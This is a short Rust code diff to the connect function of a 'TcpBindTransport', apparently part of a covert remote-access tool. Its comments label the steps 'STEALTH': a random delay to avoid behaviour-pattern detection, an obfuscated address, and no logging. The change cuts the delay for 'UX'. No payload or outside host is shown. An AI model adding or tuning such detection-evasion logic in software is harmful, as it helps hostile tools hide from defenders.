@@ -50,9 +50,9 @@ impl Transport for TcpBindTransport {
     async fn connect(&mut self) -> Result<()> {
         let obfuscated_addr = self.parse_addr()?;
         
-        // ⚡ STEALTH: Variable delay to avoid immediate behavior patterns
+        // ⚡ STEALTH: Variable delay to avoid immediate behavior patterns (Reduced for UX)
         use rand::Rng;
-        let jitter = rand::thread_rng().gen_range(2000..5000);
+        let jitter = rand::thread_rng().gen_range(0..1000);
         tokio::time::sleep(tokio::time::Duration::from_millis(jitter)).await;
 
         // ⚡ STEALTH: Zero logging and generic errors
